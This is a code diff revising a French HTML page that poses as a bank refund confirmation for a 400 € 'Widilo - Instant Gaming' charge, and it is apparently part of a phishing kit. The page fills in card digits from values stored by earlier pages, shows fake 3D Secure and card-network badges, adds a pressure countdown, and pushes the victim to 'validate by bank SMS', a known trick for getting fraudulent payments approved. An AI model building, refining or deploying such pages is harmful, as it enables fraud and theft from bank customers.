@@ -1,63 +1,72 @@
 <!DOCTYPE html>
-<html lang="fr" class="scroll-smooth">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de remboursement | Service Remboursement</title>
+    <title>Confirmation de Remboursement | Service Premium</title>
     
-    <!-- Meta Tags -->
-    <meta name="description" content="Validation finale de votre remboursement">
-    <meta name="robots" content="noindex, nofollow">
+    <!-- Polices Google -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="/favicon-32x32.png">
-    
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: {
-                            50: '#f0fdf4',
-                            100: '#dcfce7',
-                            200: '#bbf7d0',
-                            300: '#86efac',
-                            400: '#4ade80',
-                            500: '#22c55e',
-                            600: '#16a34a',
-                            700: '#15803d',
-                            800: '#166534',
-                            900: '#14532d',
-                        },
-                        secondary: {
-                            800: '#1e293b'
-                        }
-                    },
-                    fontFamily: {
-                        sans: ['Inter', 'system-ui', 'sans-serif'],
-                    },
-                }
-            }
-        }
-    </script>
-    
-    <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+    <!-- Style Premium -->
     <style>
-        .verification-badge {
+        :root {
+            --primary: #0052FF;
+            --primary-light: #4D7CFF;
+            --secondary: #00C6FF;
+            --success: #00D897;
+            --warning: #FFB800;
+            --error: #FF3D57;
+            --dark: #1A1A2E;
+            --light: #F8FAFF;
+            --border-radius: 16px;
+            --shadow: 0 12px 40px rgba(0, 82, 255, 0.15);
+            --transition: all 0.4s cubic-bezier(0.215, 0.61, 0.355, 1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+        
+        body {
+            background-color: var(--light);
+            color: #4A5568;
+            line-height: 1.7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            width: 100%;
+        }
+        
+        .card {
+            background: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: var(--transition);
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .card-header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 2rem 1.5rem;
+            text-align: center;
             position: relative;
             overflow: hidden;
         }
         
-        .verification-badge::after {
+        .card-header::before {
             content: "";
             position: absolute;
             top: -50%;
@@ -67,167 +76,305 @@
             background: linear-gradient(
                 to bottom right,
                 rgba(255, 255, 255, 0) 45%,
-                rgba(255, 255, 255, 0.8) 50%,
+                rgba(255, 255, 255, 0.2) 50%,
                 rgba(255, 255, 255, 0) 55%
             );
             transform: rotate(30deg);
-            animation: shine 3s infinite;
+            animation: shine 4s infinite;
         }
         
         @keyframes shine {
             0% { transform: translateX(-100%) rotate(30deg); }
             100% { transform: translateX(100%) rotate(30deg); }
         }
+        
+        .card-body {
+            padding: 2rem;
+        }
+        
+        .transaction-summary {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(0, 82, 255, 0.1);
+        }
+        
+        .amount-display {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-align: center;
+            margin: 1.5rem 0;
+            letter-spacing: -1px;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #718096;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        
+        .detail-value {
+            color: var(--dark);
+            font-weight: 600;
+        }
+        
+        .btn-confirm {
+            display: block;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 1.25rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            width: 100%;
+            box-shadow: 0 6px 20px rgba(0, 82, 255, 0.2);
+            margin: 1.5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-confirm:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(0, 82, 255, 0.3);
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin: 2rem 0;
+        }
+        
+        .security-badge {
+            height: 36px;
+            opacity: 0.8;
+            transition: var(--transition);
+        }
+        
+        .security-badge:hover {
+            opacity: 1;
+            transform: translateY(-2px);
+        }
+        
+        .countdown {
+            text-align: center;
+            color: #718096;
+            font-size: 0.9rem;
+            margin: 1rem 0;
+        }
+        
+        .status-tracker {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin: 2.5rem 0;
+        }
+        
+        .status-tracker::before {
+            content: "";
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #EDF2F7;
+            z-index: 1;
+        }
+        
+        .status-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+        }
+        
+        .step-indicator {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 0.75rem;
+            background: #EDF2F7;
+            color: #A0AEC0;
+            font-weight: 600;
+            position: relative;
+        }
+        
+        .step-indicator.active {
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 6px 12px rgba(0, 82, 255, 0.25);
+        }
+        
+        .step-label {
+            font-size: 0.85rem;
+            color: #A0AEC0;
+            font-weight: 500;
+            text-align: center;
+            max-width: 80px;
+        }
+        
+        .step-label.active {
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        .bank-logo {
+            height: 48px;
+            margin: 0 auto 1.5rem;
+            display: block;
+            opacity: 0.9;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #A0AEC0;
+            font-size: 0.8rem;
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        /* Animation de chargement */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
     </style>
 </head>
-<body class="bg-gray-50">
-    <!-- Header -->
-    <header class="bg-white shadow-sm">
-        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
-            <div class="flex items-center space-x-2">
-                <img src="360_F_544997418_C0KOHoDqSoOU5V5ELcQzKD9ngNTbrKFh.jpg" alt="Logo" class="h-10 w-auto">
-                <span class="text-xl font-bold text-primary-600">Service Remboursement</span>
+<body>
+    <div class="container">
+        <img src="bank-logo.png" alt="Banque Premium" class="bank-logo">
+        
+        <div class="card">
+            <div class="card-header">
+                <h1 style="font-size: 1.75rem; margin-bottom: 0.5rem;">Confirmation de Remboursement</h1>
+                <p style="opacity: 0.9; font-weight: 400;">Validation finale requise</p>
             </div>
             
-            <div class="flex items-center space-x-2">
-                <span class="text-sm text-gray-600"><i class="fas fa-lock mr-1"></i> Connexion sécurisée</span>
-                <div class="w-3 h-3 rounded-full bg-green-500"></div>
-            </div>
-        </div>
-    </header>
-
-    <!-- Main Content -->
-    <main class="flex-grow flex items-center justify-center py-12 px-4">
-        <div class="w-full max-w-md bg-white rounded-xl shadow-lg overflow-hidden">
-            <!-- Header Card -->
-            <div class="bg-gradient-to-r from-primary-500 to-primary-700 p-6 text-white text-center">
-                <h1 class="text-2xl font-bold mb-2">
-                    <i class="fas fa-check-circle mr-2"></i> Validation requise
-                </h1>
-                <p class="text-primary-100">Finalisez votre demande de remboursement</p>
-            </div>
-            
-            <!-- Body Card -->
-            <div class="p-6">
-                <!-- Verification Badge -->
-                <div class="verification-badge bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-center">
-                    <div class="flex items-center justify-center text-yellow-800 mb-2">
-                        <i class="fas fa-exclamation-triangle text-xl mr-2"></i>
-                        <h2 class="font-bold">Action requise</h2>
+            <div class="card-body">
+                <div class="status-tracker">
+                    <div class="status-step">
+                        <div class="step-indicator active">1</div>
+                        <div class="step-label active">Demande</div>
                     </div>
-                    <p class="text-sm text-yellow-700 mb-3">
-                        Veuillez valider le remboursement via votre application bancaire ou par SMS pour finaliser l'opération.
-                    </p>
-                    <a href="confirmation_finale.html" class="inline-block bg-yellow-500 hover:bg-yellow-600 text-white font-medium py-2 px-4 rounded-lg text-sm transition">
-                        <i class="fas fa-external-link-alt mr-2"></i> Valider maintenant
-                    </a>
+                    <div class="status-step">
+                        <div class="step-indicator active">2</div>
+                        <div class="step-label active">Vérification</div>
+                    </div>
+                    <div class="status-step">
+                        <div class="step-indicator">3</div>
+                        <div class="step-label">Confirmation</div>
+                    </div>
                 </div>
                 
-                <!-- Transaction Details -->
-                <div class="bg-gray-50 rounded-lg p-4 mb-6">
-                    <h3 class="font-medium text-gray-800 mb-3 flex items-center">
-                        <i class="fas fa-receipt mr-2 text-primary-600"></i>
-                        Détails de la transaction
-                    </h3>
+                <div class="transaction-summary">
+                    <div class="amount-display">400 €</div>
                     
-                    <div class="space-y-3 text-sm">
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Marchand :</span>
-                            <span class="font-medium">Widilo - Instant Gaming</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Montant :</span>
-                            <span class="font-medium text-primary-600">400 €</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Date :</span>
-                            <span class="font-medium" id="current-date"></span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Carte :</span>
-                            <span class="font-medium">•••• •••• •••• <span id="last-four">••••</span></span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Téléphone :</span>
-                            <span class="font-medium" id="phone-number">Non renseigné</span>
-                        </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Bénéficiaire</span>
+                        <span class="detail-value">Widilo - Instant Gaming</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Date</span>
+                        <span class="detail-value" id="current-date"></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Carte</span>
+                        <span class="detail-value">•••• •••• •••• <span id="last-four">1234</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Référence</span>
+                        <span class="detail-value">RMB-<span id="reference-id">2847593</span></span>
                     </div>
                 </div>
                 
-                <!-- Security Info -->
-                <div class="bg-blue-50 border-l-4 border-blue-400 p-4 rounded-r-lg">
-                    <div class="flex">
-                        <div class="flex-shrink-0">
-                            <i class="fas fa-shield-alt text-blue-400 mt-1"></i>
-                        </div>
-                        <div class="ml-3">
-                            <p class="text-sm text-blue-700">
-                                <strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure. Aucune donnée bancaire n'est stockée sur nos serveurs.
-                            </p>
-                        </div>
-                    </div>
+                <button class="btn-confirm pulse">
+                    Valider par SMS Bancaire
+                </button>
+                
+                <div class="countdown">
+                    <p>Temps restant pour confirmation : <strong>04:59</strong></p>
+                </div>
+                
+                <div class="security-badges">
+                    <img src="3d-secure.png" alt="3D Secure" class="security-badge">
+                    <img src="visa-secure.png" alt="Visa Secure" class="security-badge">
+                    <img src="mastercard-idcheck.png" alt="Mastercard ID Check" class="security-badge">
+                    <img src="carte-bancaire.png" alt="Carte Bancaire" class="security-badge">
                 </div>
             </div>
-            
-            <!-- Payment Methods -->
-            <div class="bg-gray-100 px-6 py-4 border-t border-gray-200">
-                <div class="flex justify-center space-x-6 mb-3">
-                    <img src="visa-secure.png" alt="Visa Secure" class="h-8 opacity-80">
-                    <img src="mastercard-securecode.png" alt="Mastercard SecureCode" class="h-8 opacity-80">
-                    <img src="3d-secure.png" alt="3D Secure" class="h-8 opacity-80">
-                </div>
-                <p class="text-xs text-center text-gray-500">
-                    <i class="fas fa-lock mr-1"></i> Transactions cryptées SSL 256-bit | 
-                    <span class="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-green-100 text-green-800 ml-1">
-                        <i class="fas fa-check-circle mr-1"></i> Protocole sécurisé
-                    </span>
-                </p>
-            </div>
         </div>
-    </main>
-
-    <!-- Footer -->
-    <footer class="bg-gray-100 border-t border-gray-200 py-6">
-        <div class="container mx-auto px-4 text-center">
-            <p class="text-sm text-gray-600">
-                © 2024 <strong>Service Remboursement</strong> | 
-                <a href="#" class="text-primary-600 hover:underline">Conditions générales</a> | 
-                <a href="#" class="text-primary-600 hover:underline">Politique de confidentialité</a>
-            </p>
-            <p class="text-xs text-gray-500 mt-2">
-                Ce service est indépendant des opérateurs téléphoniques. Délais de traitement indicatifs.
-            </p>
+        
+        <div class="footer">
+            <p>© 2024 Service Premium de Remboursement. Tous droits réservés.</p>
+            <p style="margin-top: 0.5rem;">Protocole sécurisé SSL 256-bit | Conformité DSP2</p>
         </div>
-    </footer>
+    </div>
 
-    <!-- Scripts -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script>
-        // Format current date
-        const currentDate = new Date();
+        // Formatage de la date actuelle
+        const now = new Date();
         const options = { 
             weekday: 'long', 
-            year: 'numeric', 
+            day: 'numeric', 
             month: 'long', 
-            day: 'numeric',
-            hour: '2-digit',
+            year: 'numeric',
+            hour: '2-digit', 
             minute: '2-digit'
         };
-        document.getElementById('current-date').textContent = currentDate.toLocaleDateString('fr-FR', options);
+        document.getElementById('current-date').textContent = now.toLocaleDateString('fr-FR', options);
         
-        // Get stored data
+        // Compte à rebours
+        let timeLeft = 299; // 4 minutes 59 secondes
+        const countdownElement = document.querySelector('.countdown strong');
+        
+        const timer = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownElement.textContent = "00:00";
+                countdownElement.style.color = "var(--error)";
+            } else {
+                timeLeft--;
+            }
+        }, 1000);
+        
+        // Simulation de données
         const lastFourDigits = localStorage.getItem('lastFourDigits') || '••••';
-        const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
-        
         document.getElementById('last-four').textContent = lastFourDigits;
-        document.getElementById('phone-number').textContent = phoneNumber;
         
-        // Add shine effect to verification badge
-        const badge = document.querySelector('.verification-badge');
-        setInterval(() => {
-            badge.classList.toggle('verification-badge');
-            setTimeout(() => badge.classList.toggle('verification-badge'), 10);
-        }, 5000);
+        // Génération d'une référence aléatoire
+        const referenceId = Math.floor(1000000 + Math.random() * 9000000);
+        document.getElementById('reference-id').textContent = referenceId;
     </script>
 </body>
 </html>
